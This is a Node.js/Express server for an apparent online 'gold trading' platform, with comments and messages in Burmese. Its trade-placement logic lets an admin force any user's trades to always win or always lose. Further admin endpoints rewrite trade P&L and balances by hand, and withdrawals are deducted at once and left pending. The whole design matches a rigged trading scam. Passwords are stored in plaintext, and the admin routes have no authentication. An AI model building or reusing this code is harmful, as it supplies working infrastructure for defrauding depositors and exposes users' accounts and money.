const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// 1. MONGODB CONNECTION
mongoose.connect('mongodb://127.0.0.1:27017/gold_trading')
  .then(() => console.log("✅ MongoDB Connected!"))
  .catch(err => console.log("❌ Connection Error:", err));

// 2. DATABASE MODELS
const userSchema = new mongoose.Schema({
    userId: { type: String, required: true, unique: true },
    userName: String,
    password: { type: String, required: true },
    balance: { type: Number, default: 0 },
    // Admin Control: 'NORMAL' (Random), 'WIN' (Always Win), 'LOSS' (Always Loss)
    tradeControl: { type: String, default: 'NORMAL' } 
});
const User = mongoose.model('User', userSchema);
// Deposit Request သိမ်းရန် Schema (အပေါ်နားမှာ ထည့်ပါ)
const DepositSchema = new mongoose.Schema({
    userId: String,
    userName: String,
    amount: Number,
    paymentMethod: String,
    note: String,
    status: { type: String, default: 'PENDING' }, // PENDING, APPROVED, REJECTED
    createdAt: { type: Date, default: Date.now }
});
const Deposit = mongoose.model('Deposit', DepositSchema);

// ငွေသွင်းရန် Request ပို့သည့် API
app.post('/api/deposit', async (req, res) => {
    try {
        const { userId, userName, amount, method } = req.body;
        const newDeposit = new Deposit({ userId, userName, amount, paymentMethod: method });
        await newDeposit.save();
        res.json({ message: "ငွေသွင်းမှု တောင်းဆိုပြီးပါပြီ။ ခဏစောင့်ပေးပါ။" });
    } catch (error) {
        res.status(500).json({ message: "Error processing deposit" });
    }
});
// Withdrawal Schema (အပေါ်နားမှာ ထည့်ပါ)
const WithdrawSchema = new mongoose.Schema({
    userId: String,
    userName: String,
    amount: Number,
    method: String,
    accountNumber: String,
    status: { type: String, default: 'PENDING' }, // PENDING, COMPLETED, REJECTED
    createdAt: { type: Date, default: Date.now }
});
const Withdraw = mongoose.model('Withdraw', WithdrawSchema);

// ငွေထုတ်ရန် Request ပို့သည့် API
app.post('/api/withdraw', async (req, res) => {
    const { userId, userName, amount, method, accountNumber } = req.body;
    try {
        const user = await User.findOne({ userId });
        if (user.balance < amount) return res.status(400).json({ message: "လက်ကျန်ငွေ မလုံလောက်ပါ" });

        // ငွေထုတ်လွှာတင်လိုက်တာနဲ့ Balance ထဲက ချက်ချင်းနုတ်ထားမည်
        user.balance -= amount;
        await user.save();

        const newWithdraw = new Withdraw({ userId, userName, amount, method, accountNumber });
        await newWithdraw.save();
        res.json({ message: "ငွေထုတ်ယူမှု တောင်းဆိုပြီးပါပြီ။" });
    } catch (error) {
        res.status(500).json({ message: "Error processing withdrawal" });
    }
});
const tradeSchema = new mongoose.Schema({
    tradeId: { type: String, unique: true, sparse: true },
    userId: String,
    amount: Number,
    duration: Number,
    position: String,
    payoutPercent: Number,
    pnl: { type: Number, default: 0 },
    status: { type: String, default: 'PENDING' },
    createdAt: { type: Date, default: Date.now }
});
const Trade = mongoose.model('Trade', tradeSchema);

// 3. API ROUTES

// 3.1. REGISTER API
app.post('/api/register', async (req, res) => {
    const { userId, userName, password } = req.body;
    try {
        const newUser = new User({ userId, userName, password, balance: 1000 }); // အစမ်းသုံးရန် $1000 ထည့်ပေးထားသည်
        await newUser.save();
        res.status(200).json({ message: "Registration Successful" });
    } catch (error) {
        res.status(400).json({ message: "User ID ရှိပြီးသားဖြစ်နေသည်" });
    }
});

// 3.2. LOGIN API
app.post('/api/login', async (req, res) => {
    const { userId, password } = req.body;
    const user = await User.findOne({ userId, password });
    if (user) {
        res.status(200).json({ 
            userId: user.userId, 
            userName: user.userName, 
            balance: user.balance,
            tradeControl: user.tradeControl 
        });
    } else {
        res.status(400).json({ message: "ID သို့မဟုတ် Password မှားနေပါသည်" });
    }
});
// Chat Schema
const MessageSchema = new mongoose.Schema({
    userId: String,
    userName: String,
    sender: String, // 'USER' သို့မဟုတ် 'ADMIN'
    text: String,
    createdAt: { type: Date, default: Date.now }
});
const Message = mongoose.model('Message', MessageSchema);

// စာပို့ရန် API
app.post('/api/chat/send', async (req, res) => {
    const { userId, userName, sender, text } = req.body;
    const newMessage = new Message({ userId, userName, sender, text });
    await newMessage.save();
    res.json({ success: true });
});

// စာများပြန်ယူရန် API
app.get('/api/chat/history/:userId', async (req, res) => {
    const messages = await Message.find({ userId: req.params.userId }).sort({ createdAt: 1 });
    res.json(messages);
});
// 3.3. PLACE TRADE API (With Admin Control Logic)
app.post('/api/trades/place', async (req, res) => {
    const { userId, amount, duration, position } = req.body;
    const tradeAmount = parseFloat(amount);

    try {
        const user = await User.findOne({ userId: userId });
        if (!user) return res.status(404).json({ message: "User မရှိပါ" });
        if (user.balance < tradeAmount) return res.status(400).json({ message: "Balance မလုံလောက်ပါ" });

        // Amount အလိုက် Payout % သတ်မှတ်ခြင်း
        let payoutRate = 0;
        if (tradeAmount >= 100 && tradeAmount <= 9999) payoutRate = 0.15;
        else if (tradeAmount >= 10000 && tradeAmount <= 29999) payoutRate = 0.25;
        else if (tradeAmount >= 30000) payoutRate = 0.35;
        else return res.status(400).json({ message: "အနည်းဆုံး $100 မှ စတင်ရပါမည်" });

        // အရင်းနှုတ်ခြင်း
        user.balance -= tradeAmount;
        await user.save();

        const tradeId = `T-${Date.now()}`;
        const newTrade = new Trade({
            tradeId,
            userId,
            amount: tradeAmount,
            duration,
            position,
            payoutPercent: payoutRate
        });
        await newTrade.save();

        // ရလဒ်စောင့်ခြင်း (Admin Control ကို စစ်ဆေးမည်)
        setTimeout(async () => {
            const tradeUpdate = await Trade.findById(newTrade._id);
            const userUpdate = await User.findOne({ userId: userId });

            let isWin = false;

            // Admin Control Logic စစ်ဆေးခြင်း
            if (userUpdate.tradeControl === 'WIN') {
                isWin = true; // အမြဲနိုင်စေမည်
            } else if (userUpdate.tradeControl === 'LOSS') {
                isWin = false; // အမြဲရှုံးစေမည်
            } else {
                isWin = Math.random() < 0.5; // Normal ဆိုလျှင် 50/50 Random
            }

            if (isWin) {
                const profit = tradeAmount * payoutRate;
                userUpdate.balance += (tradeAmount + profit);
                tradeUpdate.status = 'WIN';
                tradeUpdate.pnl = profit;
            } else {
                tradeUpdate.status = 'LOSS';
                tradeUpdate.pnl = -tradeAmount;
            }

            await userUpdate.save();
            await tradeUpdate.save();
            console.log(`Trade ID: ${tradeId} | User: ${userId} | Control: ${userUpdate.tradeControl} | Result: ${tradeUpdate.status}`);
        }, duration * 1000);

        res.status(200).json({ 
            message: "Order တင်ပြီးပါပြီ။ " + duration + "s အကြာတွင် ရလဒ်ထွက်ပါမည်။", 
            newBalance: user.balance 
        });

    } catch (error) {
        res.status(500).json({ message: "Server Error" });
    }
});

// 3.4. ADMIN CONTROL API (User ၏ အနိုင်အရှုံးကို ထိန်းချုပ်ရန်)
app.post('/api/admin/control-user', async (req, res) => {
    const { userId, status } = req.body; // status: 'NORMAL', 'WIN', 'LOSS'
    try {
        const user = await User.findOneAndUpdate({ userId }, { tradeControl: status }, { new: true });
        if (!user) return res.status(404).json({ message: "User ရှာမတွေ့ပါ" });
        res.json({ message: `User ${userId} ၏ Control ကို ${status} သို့ ပြောင်းလိုက်ပါပြီ` });
    } catch (error) {
        res.status(500).json({ message: "Server Error" });
    }
});

// 3.5. GET USER DATA API (Balance & Control status စစ်ရန်)
app.get('/api/user/:userId', async (req, res) => {
    const user = await User.findOne({ userId: req.params.userId });
    if (user) {
        res.json({ balance: user.balance, tradeControl: user.tradeControl });
    } else {
        res.status(404).json({ message: "User မရှိပါ" });
    }
});
// server.js ထဲမှာ ထည့်ရန်
// Admin - User အားလုံးစာရင်းကို ယူခြင်း
app.get('/api/admin/users', async (req, res) => {
    try {
        const users = await User.find({}, 'userId userName balance tradeControl');
        res.json(users);
    } catch (error) {
        res.status(500).json({ message: "Internal Server Error" });
    }
});

app.post('/api/users/init', async (req, res) => {
    try {
        const sampleUsers = [
            { userId: '10015', userName: 'Mg Mg', password: 'password', balance: 1200, tradeControl: 'NORMAL' },
            { userId: '10018', userName: 'Aye Aye', password: 'password', balance: 1450, tradeControl: 'NORMAL' },
            { userId: '10020', userName: 'Zaw Zaw', password: 'password', balance: 900, tradeControl: 'NORMAL' }
        ];

        for (const sample of sampleUsers) {
            await User.updateOne(
                { userId: sample.userId },
                { $setOnInsert: sample },
                { upsert: true }
            );
        }

        res.json({ message: 'Test users initialized.' });
    } catch (error) {
        res.status(500).json({ message: 'Failed to initialize users.' });
    }
});

app.post('/api/trades/init', async (req, res) => {
    try {
        const sampleTrades = [
            { tradeId: 'T-12501', userId: '10018', amount: 240, duration: 30, position: 'BUY', payoutPercent: 0.15, pnl: 252.00, status: 'WIN' },
            { tradeId: 'T-12502', userId: '10015', amount: 180, duration: 15, position: 'SELL', payoutPercent: 0.15, pnl: -180.00, status: 'LOSS' },
            { tradeId: 'T-12503', userId: '10020', amount: 520, duration: 60, position: 'BUY', payoutPercent: 0.25, pnl: 130.00, status: 'WIN' }
        ];

        for (const sample of sampleTrades) {
            await Trade.updateOne(
                { tradeId: sample.tradeId },
                { $setOnInsert: sample },
                { upsert: true }
            );
        }

        res.json({ message: 'Test trades initialized.' });
    } catch (error) {
        res.status(500).json({ message: 'Failed to initialize trades.' });
    }
});

app.post('/api/admin/deposit', async (req, res) => {
    try {
        const { userId, amount, note } = req.body;
        const user = await User.findOne({ userId });
        if (!user) return res.status(404).json({ message: 'User not found.' });

        user.balance += parseFloat(amount);
        await user.save();

        const adminDeposit = new Deposit({
            userId,
            userName: user.userName || 'Unknown',
            amount: parseFloat(amount),
            paymentMethod: 'ADMIN_MANUAL',
            status: 'APPROVED',
            note: note || 'Admin manual deposit'
        });
        await adminDeposit.save();

        res.json({ message: 'Manual deposit completed.', newBalance: user.balance });
    } catch (error) {
        res.status(500).json({ message: 'Failed to complete manual deposit.' });
    }
});

app.post('/api/admin/adjust-pnl', async (req, res) => {
    try {
        const { tradeId, newPnl } = req.body;
        const trade = await Trade.findOne({ tradeId });
        if (!trade) return res.status(404).json({ message: 'Trade not found.' });

        const user = await User.findOne({ userId: trade.userId });
        if (!user) return res.status(404).json({ message: 'Trade user not found.' });

        const oldPnl = trade.pnl || 0;
        const delta = parseFloat(newPnl) - oldPnl;

        trade.pnl = parseFloat(newPnl);
        trade.status = newPnl >= 0 ? 'WIN' : 'LOSS';
        await trade.save();

        user.balance += delta;
        await user.save();

        res.json({ message: 'P&L adjusted successfully.', newBalance: user.balance });
    } catch (error) {
        res.status(500).json({ message: 'Failed to adjust P&L.' });
    }
});

// User ၏ Dashboard အချက်အလက်များယူရန်
app.get('/api/user-stats/:userId', async (req, res) => {
    try {
        const userId = req.params.userId;
        const trades = await Trade.find({ userId: userId });
        
        const totalTrades = trades.length;
        const winTrades = trades.filter(t => t.status === 'WIN').length;
        const lossTrades = trades.filter(t => t.status === 'LOSS').length;
        
        res.json({
            totalTrades,
            winTrades,
            lossTrades,
            recentTrades: trades.slice(-5).reverse() // နောက်ဆုံးလုပ်ထားသော ၅ ခု
        });
    } catch (error) {
        res.status(500).json({ message: "Server Error" });
    }
});
// SERVER START
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server is running on http://localhost:${PORT}`);
});